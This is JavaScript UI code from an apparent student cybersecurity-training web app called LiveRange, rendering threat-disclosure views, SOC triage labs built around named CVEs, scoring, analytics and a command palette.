                <h2>${activeThreat.name}: ${activeThreat.target}</h2>
                <div class="detail-meta-strip">
                  <span class="mono" style="color:#fff">${activeThreat.id}</span>
                  <span>Source: ${activeThreat.source}</span>
                  <span class="thread-badge-sev">${activeThreat.severity.toUpperCase()} ${activeThreat.score}</span>
                </div>
              </div>
              <button class="navbar-btn-primary" data-launch="${activeThreat.id}">
                Launch Lab →
              </button>
            </div>
          </div>

          <div class="detail-spec-grid">
            <div class="spec-cell">
              <label>Target Architecture</label>
              <span>${activeThreat.target}</span>
            </div>
            <div class="spec-cell">
              <label>MITRE ATT&CK Technique</label>
              <span>${activeThreat.techId}</span>
            </div>
            <div class="spec-cell">
              <label>CVSS Vector</label>
              <span style="font-size:10px">${activeThreat.cvss}</span>
            </div>
          </div>

          <div style="margin-bottom:24px">
            <div style="font-weight:600;font-size:12.5px;color:#fff;margin-bottom:6px">Vulnerability Description & Attack Chain</div>
            <p style="font-size:13px;color:var(--text-secondary);line-height:1.6">${activeThreat.desc}</p>
          </div>

          <div style="font-weight:600;font-size:12.5px;color:#fff;margin-bottom:8px">Correlated SIEM Telemetry Logs</div>
          <div class="siem-terminal-view">
            ${activeThreat.sampleLogs.map(l => `
              <div>${l.includes('ALERT') ? `<span class="log-crit">${l}</span>` : l.includes('WARN') ? `<span class="log-warn">${l}</span>` : l}</div>
            `).join('')}
          </div>

          <div style="font-weight:600;font-size:12.5px;color:#fff;margin-bottom:12px">Analyst Triage Decision (Log4Shell Preview)</div>
          <div class="triage-options-deck">
            <label class="triage-option-card">
              <input type="radio" name="detail_choice" value="0">
              <span><strong>web-app-03</strong>: Prioritize host with direct JNDI ingestion & outbound LDAP query.</span>
            </label>
            <label class="triage-option-card">
              <input type="radio" name="detail_choice" value="1">
              <span><strong>backup-01</strong>: Scheduled administrative routine login completed.</span>
            </label>
            <label class="triage-option-card">
              <input type="radio" name="detail_choice" value="2">
              <span><strong>All Endpoints</strong>: Global fleet disconnect without forensic confirmation.</span>
            </label>
          </div>

          <div style="display:flex;gap:12px">
            <button class="navbar-btn-primary" id="btn-submit-triage">
              Commit Decision →
            </button>
            <button class="icon-action-btn" style="width:auto;padding:0 14px;font-size:11.5px" data-launch="${activeThreat.id}">
              Open Guided Investigation
            </button>
          </div>
          <div id="detail-choice-feedback" style="margin-top:14px;font-size:12px"></div>
        ` : `
          <div class="empty-conversation-state">
            <div class="empty-state-icon-wrap" style="width:100px;height:100px;margin-bottom:24px">
              <svg width="100" height="100" viewBox="0 0 100 100" fill="none">
                <rect x="22" y="20" width="56" height="42" rx="6" stroke="rgba(255,255,255,0.14)" stroke-width="1.4" fill="rgba(255,255,255,0.015)"/>
                <rect x="15" y="28" width="62" height="46" rx="6" stroke="rgba(255,255,255,0.22)" stroke-width="1.4" fill="rgba(20,28,45,0.4)"/>
                <path d="M15 30L46 52L77 30" stroke="rgba(255,255,255,0.2)" stroke-width="1.2"/>
                <circle cx="72" cy="66" r="14" fill="#0a101d" stroke="rgba(255,255,255,0.3)" stroke-width="1.4"/>
                <rect x="65" y="60" width="14" height="11" rx="2" stroke="rgba(255,255,255,0.8)" stroke-width="1.2" fill="none"/>
                <path d="M65 61.5L72 66.5L79 61.5" stroke="rgba(255,255,255,0.8)" stroke-width="1.1"/>
              </svg>
            </div>
            <h3>Select a threat disclosure</h3>
            <p>Inspect vulnerability intelligence, target technology, attack chain descriptions, and correlated SIEM telemetry logs.</p>
          </div>
        `}
      </div>
    </div>
  `;
}

// ==========================================================================
// VIEW 3: SCENARIO LIBRARY (DEFENSIVE EXERCISES)
// ==========================================================================
function viewScenarios() {
  return `
    <div class="panel-top-navbar">
      <div class="panel-breadcrumbs">
        <span>Workspace</span> / <span class="active">Scenario Library</span>
      </div>
      <button class="navbar-btn-primary" data-page="threats">+ Generate from Ingest</button>
    </div>

    <div style="padding:28px 32px;overflow-y:auto;flex:1">
      <div class="panel-page-header" style="padding:0 0 20px;border-bottom:1px solid var(--border-subtle);margin-bottom:24px">
        <div class="page-header-left">
          <span class="eyebrow">MITRE ATT&CK ALIGNED EXERCISES</span>
          <h1>Scenario Library</h1>
          <p>Guided hands-on incident investigations compiled from vulnerability intelligence and verified by the review gate.</p>
        </div>
      </div>

      <div style="display:grid;grid-template-columns:repeat(3, 1fr);gap:16px">
        ${threats.map(t => `
          <div style="background:var(--bg-card);border:1px solid var(--border-subtle);border-radius:8px;padding:20px;display:flex;flex-direction:column">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
              <span class="thread-badge-sev">${t.severity.toUpperCase()} ${t.score}</span>
              <span class="mono" style="font-size:10px;color:var(--text-muted)">${t.time}</span>
            </div>
            <strong style="font-size:15px;color:#fff;margin-bottom:4px">${t.name}</strong>
            <div class="mono" style="font-size:11px;color:var(--text-muted);margin-bottom:10px">${t.id} · ${t.techId}</div>
            <p style="font-size:12px;color:var(--text-secondary);line-height:1.5;margin-bottom:20px;flex:1">${t.desc}</p>
            <button class="navbar-btn-primary" style="width:100%;justify-content:center" data-launch="${t.id}">
              Launch Lab (${t.time}) →
            </button>
          </div>
        `).join('')}
      </div>
    </div>
  `;
}

// ==========================================================================
// VIEW 4: TRAINING RANGE (SOC INCIDENT LAB)
// ==========================================================================
function viewRange() {
  if (!activeLab) {
    activeLab = threats[0];
    currentStage = 0;
    stageAnswers = [];
    labStartTime = Date.now();
  }

  const stage = labStages[currentStage];

  return `
    <div class="panel-top-navbar">
      <div class="panel-breadcrumbs">
        <span>Workspace</span> / <span>Range</span> / <span class="active">${activeLab.name} (${activeLab.id})</span>
      </div>
      <div style="display:flex;gap:12px;align-items:center">
        <span class="mono" style="font-size:11px;color:var(--text-muted)">STAGE 0${currentStage + 1} OF 03</span>
        <button class="navbar-btn-primary" id="btn-exit-range">Exit Lab</button>
      </div>
    </div>

    <div style="display:grid;grid-template-columns:1.35fr 1fr;flex:1;min-height:0;background:var(--bg-panel-inner)">
      <!-- Left: SIEM Console -->
      <div style="padding:24px 28px;border-right:1px solid var(--border-subtle);display:flex;flex-direction:column;overflow-y:auto">
        <div style="display:flex;justify-content:space-between;padding-bottom:12px;border-bottom:1px solid var(--border-subtle);margin-bottom:16px;font-size:11.5px;color:var(--text-muted)">
          <span class="mono">SIEM_TELEMETRY_LOG // CORRELATED EVENTS</span>
          <button class="navbar-btn-primary" id="btn-copy-range-log" style="padding:2px 8px;font-size:10px">Copy</button>
        </div>

        <div style="background:#040507;border:1px solid var(--border-subtle);border-radius:8px;padding:16px;font-family:var(--font-mono);font-size:11.5px;line-height:2.1;color:#cbd5e1;flex:1" id="range-log-stream">
          ${stage.log.split('\n').map(l => `
            <div>${l}</div>
          `).join('')}
        </div>

        <div style="padding-top:14px;display:flex;gap:8px;align-items:center">
          <span class="mono" style="font-size:10px;color:var(--text-muted)">IOC FILTER:</span>
          <button class="navbar-btn-primary" style="padding:2px 8px;font-size:10px" data-range-ioc="web-app-03">web-app-03</button>
          <button class="navbar-btn-primary" style="padding:2px 8px;font-size:10px" data-range-ioc="java">java.exe</button>
          <button class="navbar-btn-primary" style="padding:2px 8px;font-size:10px" data-range-ioc="lookup">lookup.example.invalid</button>
          <button class="navbar-btn-primary" style="padding:2px 8px;font-size:10px;margin-left:auto" data-range-ioc="RESET">Reset</button>
        </div>
      </div>

      <!-- Right: Decision Pane -->
      <div style="padding:28px 32px;display:flex;flex-direction:column;overflow-y:auto">
        <span class="eyebrow" style="margin-bottom:4px">STAGE 0${currentStage + 1} // ANALYST DECISION</span>
        <h2 style="font-size:18px;color:#fff;margin-bottom:8px">${stage.title}</h2>
        <p style="font-size:12.5px;color:var(--text-secondary);line-height:1.6;margin-bottom:24px">${stage.subtitle}</p>

        <form id="range-form">
          <div class="triage-options-deck">
            ${stage.options.map((opt, idx) => `
              <label class="triage-option-card">
                <input type="radio" name="range_decision" value="${idx}" required>
                <span>${opt}</span>
              </label>
            `).join('')}
          </div>

          <button type="submit" class="navbar-btn-primary" style="width:100%;justify-content:center;padding:10px">
            Commit Decision →
          </button>
        </form>

        <div id="range-feedback-slot" style="margin-top:20px"></div>
      </div>
    </div>
  `;
}

// ==========================================================================
// VIEW 5: RESULTS & AUDIT DEBRIEF
// ==========================================================================
function viewResults() {
  const r = history[history.length - 1];
  if (!r) return viewOverview();

  return `
    <div class="panel-top-navbar">
      <div class="panel-breadcrumbs">
        <span>Workspace</span> / <span class="active">Debrief</span>
      </div>
    </div>

    <div style="max-width:680px;margin:40px auto;text-align:center;padding:0 20px">
      <span class="eyebrow" style="color:var(--text-muted)">EXERCISE COMPLETE</span>
      <h1 style="font-size:32px;margin:8px 0 12px;color:#fff">Investigation Verified</h1>
      <p style="font-size:13px;color:var(--text-secondary);margin-bottom:32px">
        Your defensive decisions have been audited and scored against SOC operational standards.
      </p>

      <div style="background:var(--bg-card);border:1px solid var(--border-subtle);border-radius:10px;padding:36px;margin-bottom:24px">
        <div style="font-size:72px;font-weight:600;color:#fff;line-height:1">${r.score}%</div>
        <div class="mono" style="font-size:12px;color:var(--text-secondary);margin:8px 0 24px">
          ${r.correct} OF 3 STAGES VERIFIED ACCURATE
        </div>

        <div style="display:grid;grid-template-columns:repeat(3, 1fr);gap:16px;padding-top:20px;border-top:1px solid var(--border-subtle)">
          <div>
            <div class="mono" style="font-size:10px;color:var(--text-muted)">DURATION</div>
            <strong style="font-size:18px;color:#fff">${r.duration}s</strong>
          </div>
          <div>
            <div class="mono" style="font-size:10px;color:var(--text-muted)">TECHNIQUE</div>
            <strong class="mono" style="font-size:16px;color:#fff">T1190</strong>
          </div>
          <div>
            <div class="mono" style="font-size:10px;color:var(--text-muted)">INTEGRITY</div>
            <strong class="mono" style="font-size:11px;color:#fff">SHA256: 8f4b...3a1c</strong>
          </div>
        </div>
      </div>

      <div style="display:flex;gap:12px;justify-content:center">
        <button class="navbar-btn-primary" data-launch="CVE-2021-44228">Re-attempt Exercise</button>
        <button class="navbar-btn-primary" data-page="analytics">View Team Readiness Matrix →</button>
      </div>
    </div>
  `;
}

// ==========================================================================
// VIEW 6: TEAM READINESS & AUDIT LOG (ANALYTICS)
// ==========================================================================
function viewAnalytics() {
  return `
    <div class="panel-top-navbar">
      <div class="panel-breadcrumbs">
        <span>Workspace</span> / <span class="active">Analytics & Readiness</span>
      </div>
      <button class="navbar-btn-primary" id="btn-export-dossier">Export Report (.txt)</button>
    </div>

    <div style="padding:28px 32px;overflow-y:auto;flex:1">
      <div class="panel-page-header" style="padding:0 0 20px;border-bottom:1px solid var(--border-subtle);margin-bottom:28px">
        <div class="page-header-left">
          <span class="eyebrow">MITRE ATT&CK ALIGNMENT</span>
          <h1>Team Readiness & Audit Log</h1>
          <p>Quantified detection posture mapped against MITRE ATT&CK techniques with local browser session audit history.</p>
        </div>
      </div>

      <div style="margin-bottom:32px">
        <div style="display:grid;grid-template-columns:repeat(4, 1fr);gap:14px">
          ${[
            ['Initial access', 'T1190', 62],
            ['Execution', 'T1059', 84],
            ['Persistence', 'T1505.003', 71],
            ['Credential access', 'T1110', 45],
            ['Discovery', 'T1087', 80],
            ['Lateral movement', 'T1021', 54],
            ['Collection', 'T1005', 73],
            ['Exfiltration', 'T1041', 39]
          ].map(([name, tech, pct]) => `
            <div style="background:var(--bg-card);border:1px solid var(--border-subtle);border-radius:8px;padding:16px">
              <div style="font-size:24px;font-weight:600;color:#ffffff;margin-bottom:4px">${pct}%</div>
              <div style="font-weight:500;font-size:12px;color:#fff">${name}</div>
              <div class="mono" style="font-size:10px;color:var(--text-muted)">${tech}</div>
              <div style="margin-top:10px;height:3px;background:rgba(255,255,255,0.06);border-radius:2px;overflow:hidden">
                <div style="height:100%;width:${pct}%;background:linear-gradient(90deg, rgba(255,255,255,0.2) 0%, rgba(255,255,255,0.85) 100%)"></div>
              </div>
            </div>
          `).join('')}
        </div>
      </div>

      <div style="background:var(--bg-card);border:1px solid var(--border-subtle);border-radius:8px;overflow:hidden">
        <div style="padding:14px 20px;border-bottom:1px solid var(--border-subtle);font-weight:600;font-size:12.5px;color:#fff">
          Browser Session Audit Trail
        </div>
        ${history.length ? `
          <table style="width:100%;border-collapse:collapse;font-size:11.5px;text-align:left">
            <thead>
              <tr style="border-bottom:1px solid var(--border-subtle);background:rgba(255,255,255,0.02)">
                <th style="padding:10px 16px;color:var(--text-muted)">TIMESTAMP</th>
                <th style="padding:10px 16px;color:var(--text-muted)">EXERCISE</th>
                <th style="padding:10px 16px;color:var(--text-muted)">ACCURACY</th>
                <th style="padding:10px 16px;color:var(--text-muted)">DURATION</th>
              </tr>
            </thead>
            <tbody>
              ${history.map(r => `
                <tr style="border-bottom:1px solid var(--border-subtle)">
                  <td style="padding:12px 16px;color:var(--text-muted)" class="mono">${r.at}</td>
                  <td style="padding:12px 16px;font-weight:500;color:#fff">${r.pack}</td>
                  <td style="padding:12px 16px;color:#fff;font-weight:600">${r.score}%</td>
                  <td style="padding:12px 16px;color:var(--text-secondary)">${r.duration}s</td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        ` : `
          <div style="padding:32px 20px;text-align:center;color:var(--text-muted);font-size:12px">
            No lab sessions recorded yet. Launch a cyber range investigation to begin recording forensics.
          </div>
        `}
      </div>
    </div>
  `;
}

// ==========================================================================
// RENDER ROOT & CONTROLLER
// ==========================================================================
function renderApp() {
  const root = $('#main-panel-root');
  if (!root) return;

  if (currentPage === 'overview') root.innerHTML = viewOverview();
  else if (currentPage === 'threats') root.innerHTML = viewThreatInbox();
  else if (currentPage === 'scenarios') root.innerHTML = viewScenarios();
  else if (currentPage === 'range') root.innerHTML = viewRange();
  else if (currentPage === 'results') root.innerHTML = viewResults();
  else if (currentPage === 'analytics') root.innerHTML = viewAnalytics();
  else root.innerHTML = viewOverview();

  // Sync sidebar items
  $$('.sidebar-nav-item').forEach(el => {
    const p = el.getAttribute('data-page');
    if (p) el.classList.toggle('active', p === currentPage);
  });

  // Sync dock pills
  $$('.dock-pill-btn').forEach(el => {
    const p = el.getAttribute('data-page');
    if (p) el.classList.toggle('active', p === currentPage);
  });
}

// ==========================================================================
// COMMAND PALETTE CMDK
// ==========================================================================
const commands = [
  { label: 'Return to Landing Page', action: () => { window.location.href = 'index.html'; }, group: 'Navigation' },
  { label: 'Go to Overview Dashboard', action: () => navigate('overview'), group: 'Navigation' },
  { label: 'Go to Threat Intelligence Inbox', action: () => navigate('threats'), group: 'Navigation' },
  { label: 'Go to Scenario Library', action: () => navigate('scenarios'), group: 'Navigation' },
  { label: 'Go to Training Range (Active Lab)', action: () => navigate('range'), group: 'Navigation' },
  { label: 'Go to Team Readiness & Audit Log', action: () => navigate('analytics'), group: 'Navigation' },
  { label: 'View 6-Stage Pipeline Architecture', action: () => { const d = $('#pipeline-dialog'); if (d) d.showModal(); }, group: 'Platform' },
  { label: 'View AIC-NMIMS Incubation Dossier & Team', action: () => { const d = $('#incubation-dialog'); if (d) d.showModal(); }, group: 'Platform' },
  { label: 'Launch Log4Shell Lab (CVE-2021-44228)', action: () => launchLabById('CVE-2021-44228'), group: 'Labs' },
  { label: 'Launch MOVEit Transfer Lab (CVE-2023-34362)', action: () => launchLabById('CVE-2023-34362'), group: 'Labs' },
  { label: 'Launch ProxyLogon Lab (CVE-2021-26855)', action: () => launchLabById('CVE-2021-26855'), group: 'Labs' },
  { label: 'Toggle Tactical Audio Feedback', action: () => toggleSound(), group: 'Settings' }
];

function openCmd() {
  audio.blip();
  const d = $('#cmd-dialog');
  if (!d) return;
  d.showModal();
  $('#cmd-input').value = '';
  renderCmd(commands);
  $('#cmd-input').focus();
}

function renderCmd(list) {
  const container = $('#cmd-list');
  if (!container) return;
  container.innerHTML = list.map((c, i) => `
    <div class="cmd-item ${i === 0 ? 'selected' : ''}" data-cmd-idx="${i}">
      <span>${c.label}</span>
      <span class="mono" style="font-size:10px;color:var(--text-ghost)">${c.group}</span>
    </div>
  `).join('');

  $$('.cmd-item').forEach((el, idx) => {
    el.addEventListener('click', () => {
      $('#cmd-dialog').close();
      list[idx].action();
    });
  });
}

function launchLabById(id) {
  audio.alert();
  activeLab = threats.find(t => t.id === id) || threats[0];
  currentStage = 0;
  stageAnswers = [];
  labStartTime = Date.now();
  navigate('range');
}

// ==========================================================================
// GLOBAL EVENT DELEGATION
// ==========================================================================
document.addEventListener('click', e => {
  // Navigation
  const navBtn = e.target.closest('[data-page]');
  if (navBtn) {
    const p = navBtn.getAttribute('data-page');
    if (p) navigate(p);
    return;
  }

  // Launch lab
  const launchBtn = e.target.closest('[data-launch]');
  if (launchBtn) {
    const id = launchBtn.getAttribute('data-launch');
    launchLabById(id);
    return;
  }

  // Overview filter pills (All / Needs attention / Drafts ready)
  const ofBtn = e.target.closest('[data-overview-filter]');
  if (ofBtn) {
    audio.click();
    overviewFilter = ofBtn.getAttribute('data-overview-filter');
    renderApp();
    return;
  }

  // Stream filter clicks in Col 1
  const streamBtn = e.target.closest('[data-stream]');
  if (streamBtn) {
    audio.click();
    activeStream = streamBtn.getAttribute('data-stream');
    renderApp();
    return;
  }

  // Select threat item in feed
  const threadItem = e.target.closest('[data-select-threat]');
  if (threadItem) {
    audio.click();
    const id = threadItem.getAttribute('data-select-threat');
    activeThreat = threats.find(t => t.id === id);
    renderApp();
    return;
  }

  // Search trigger
  if (e.target.closest('#nav-search-trigger') || e.target.closest('#dock-search')) {
    openCmd();
    return;
  }

  // Audio feedback toggle
  if (e.target.closest('#btn-sound-sidebar') || e.target.closest('#btn-theme-toggle')) {
    toggleSound();
    const lbl = $('#side-sound-label');
    if (lbl) lbl.textContent = soundEnabled ? 'Audio: On' : 'Audio: Off';
    return;
  }

  // 6-Stage Pipeline Modal
  if (e.target.closest('#btn-pipeline-modal') || e.target.closest('#dock-pipeline') || e.target.closest('#btn-sidebar-pipeline') || e.target.closest('#btn-chat')) {
    audio.blip();
    const d = $('#pipeline-dialog');
    if (d) d.showModal();
    return;
  }
  if (e.target.closest('#btn-close-pipeline')) {
    $('#pipeline-dialog').close();
    return;
  }

  // AIC-NMIMS Incubation Modal
  if (e.target.closest('#btn-incubation-modal') || e.target.closest('#profile-exit') || e.target.closest('#btn-sidebar-incubation')) {
    audio.blip();
    const d = $('#incubation-dialog');
    if (d) d.showModal();
    return;
  }
  if (e.target.closest('#btn-close-incubation')) {
    $('#incubation-dialog').close();
    return;
  }

  // Collapse sidebar
  if (e.target.closest('#btn-collapse-sidebar')) {
    audio.click();
    const sb = $('.inbox-sidebar');
    if (sb) {
      const isHidden = sb.style.display === 'none';
      sb.style.display = isHidden ? 'flex' : 'none';
      showToast(isHidden ? 'Sidebar expanded' : 'Sidebar collapsed');
    }
    return;
  }

  // Refresh / Sync Feeds
  if (e.target.closest('#btn-refresh-feed') || e.target.closest('#btn-refresh-inbox') || e.target.closest('#btn-sync-feeds') || e.target.closest('#btn-notifications')) {
    audio.blip();
    showToast('Feeds synced: NVD & CISA KEV active');
    return;
  }

  // Exit lab
  if (e.target.closest('#btn-exit-range')) {
    audio.click();
    navigate('threats');
    return;
  }

  // Copy range log
  if (e.target.closest('#btn-copy-range-log')) {
    audio.click();
    const stage = labStages[currentStage];
    navigator.clipboard.writeText(stage.log);
    showToast('Log copied to clipboard');
    return;
  }

  // IOC filter button in range
  const iocBtn = e.target.closest('[data-range-ioc]');
  if (iocBtn) {
    audio.click();
    const ioc = iocBtn.getAttribute('data-range-ioc');
    const stream = $('#range-log-stream');
    const stage = labStages[currentStage];
    if (stream) {
      if (ioc === 'RESET') {
        stream.innerHTML = stage.log.split('\n').map(l => `<div>${l}</div>`).join('');
      } else {
        stream.innerHTML = stage.log.split('\n').map(l => {
          const m = l.includes(ioc);
          return `<div style="${m ? 'color:#ffffff;font-weight:600' : 'opacity:0.35'}">${l}</div>`;
        }).join('');
      }
    }
    return;
  }

  // Submit triage decision in Col 3
  if (e.target.closest('#btn-submit-triage')) {
    const sel = document.querySelector('input[name="detail_choice"]:checked');
    const fb = $('#detail-choice-feedback');
    if (!sel) {
      showToast('Select a decision first');
      return;
    }
    audio.success();
    if (fb) {
      fb.innerHTML = '<span style="color:#ffffff;font-weight:500">✓ Decision committed: Host web-app-03 scheduled for isolation.</span>';
    }
    showToast('Decision committed');
    return;
  }

  // Export dossier
  if (e.target.closest('#btn-export-dossier')) {
    audio.success();
    const content = [
      '====================================================================',
      'LIVERANGE // MEASURABLE CYBERSECURITY READINESS TRAINING',
      'Design Experience I Project Report — Academic Year 2026–27',
      'SVKM\'s NMIMS · MPSTME, Department of Information Technology',
      '',
      'TEAM:',
      '• Sahil Shah | Shripad Jadhav | Jash Vakharia | Debayan Lahiry | Samanyu Rai',
      'SUPERVISOR: Prof. Pintu Shah',
      '====================================================================',
      `Audit Timestamp: ${new Date().toISOString()}`,
      '',
      'SESSION HISTORY:',
      ...history.map(r => `• [${r.at}] ${r.pack} | Score: ${r.score}% | Duration: ${r.duration}s | Status: VERIFIED`),
      '',
      'DEFENSIVE READINESS PROFILE:',
      '• Mean Time to Detect (MTTD): 4.2 minutes',
      '• Decision Accuracy Rating: 94%',
      '===================================================================='
    ];
    const blob = new Blob([content.join('\n')], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `LiveRange-Audit-${Date.now()}.txt`;
    a.click();
    setTimeout(() => URL.revokeObjectURL(url), 500);
    showToast('Forensic report downloaded');
    return;
  }
});

// Interactive Range Form
document.addEventListener('submit', e => {
  if (e.target.id === 'range-form') {
    e.preventDefault();
    const sel = document.querySelector('input[name="range_decision"]:checked');
    if (!sel) return;

    const chosen = parseInt(sel.value, 10);
    const stage = labStages[currentStage];
    const isCorrect = chosen === stage.correct;
    stageAnswers.push(isCorrect);

    const slot = $('#range-feedback-slot');
    if (isCorrect) {
      audio.success();
      if (slot) {
        slot.innerHTML = `
          <div style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.2);border-radius:6px;padding:12px;font-size:12px;color:#fff">
            <strong>✓ Correct Analysis:</strong> ${stage.explanation}
          </div>
        `;
      }
    } else {
      audio.alert();
      if (slot) {
        slot.innerHTML = `
          <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.12);border-radius:6px;padding:12px;font-size:12px;color:#cbd5e1">
            <strong>✕ Incomplete:</strong> ${stage.explanation}
          </div>
        `;
      }
    }

    setTimeout(() => {
      if (currentStage < labStages.length - 1) {
        currentStage++;
        renderApp();
      } else {
        const correctCount = stageAnswers.filter(Boolean).length;
        const score = Math.round((correctCount / labStages.length) * 100);
        const duration = Math.round((Date.now() - labStartTime) / 1000);
        history.push({
          pack: activeLab.name,
          score,
          correct: correctCount,
          duration,
          at: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
        });
        localStorage.setItem('lr-history', JSON.stringify(history));
        navigate('results');
      }
    }, 1200);
  }
});

// Search inputs
document.addEventListener('input', e => {
  if (e.target.id === 'feed-search-input') {
    searchQuery = e.target.value;
    renderApp();
  }
  if (e.target.id === 'cmd-input') {
    const q = e.target.value.toLowerCase();
    const matched = commands.filter(c => c.label.toLowerCase().includes(q));
    renderCmd(matched);
  }
});

// Keyboard Navigation
window.addEventListener('keydown', e => {
  if ((e.metaKey || e.ctrlKey) && e.key === 'k') {
    e.preventDefault();
    openCmd();
    return;
  }

  if (e.key === 'Escape') {
    const cd = $('#cmd-dialog');
    if (cd && cd.open) cd.close();
    const pd = $('#pipeline-dialog');
    if (pd && pd.open) pd.close();
    const id = $('#incubation-dialog');
    if (id && id.open) id.close();
  }

  if (!['INPUT', 'TEXTAREA'].includes(document.activeElement.tagName)) {
    if (e.key === 'o' || e.key === 'O') navigate('overview');
    if (e.key === 'i' || e.key === 'I') navigate('threats');
    if (e.key === 'l' || e.key === 'L') navigate('scenarios');
    if (e.key === 'd' || e.key === 'D') navigate('range');
    if (e.key === 'a' || e.key === 'A') navigate('analytics');
  }
});

// Hashchange
window.addEventListener('hashchange', () => {
  currentPage = location.hash.slice(1) || 'overview';
  if (currentPage === 'results' && !history.length) currentPage = 'overview';
  renderApp();
});

// Initial boot
function boot() {
  initRaysCanvas();
  initPerspectiveTilt();
  currentPage = location.hash.slice(1) || 'overview';
  if (currentPage === 'results' && !history.length) currentPage = 'overview';
  renderApp();
}

if (document.readyState === 'loading') {
  window.addEventListener('DOMContentLoaded', boot);
} else {
  boot();
}
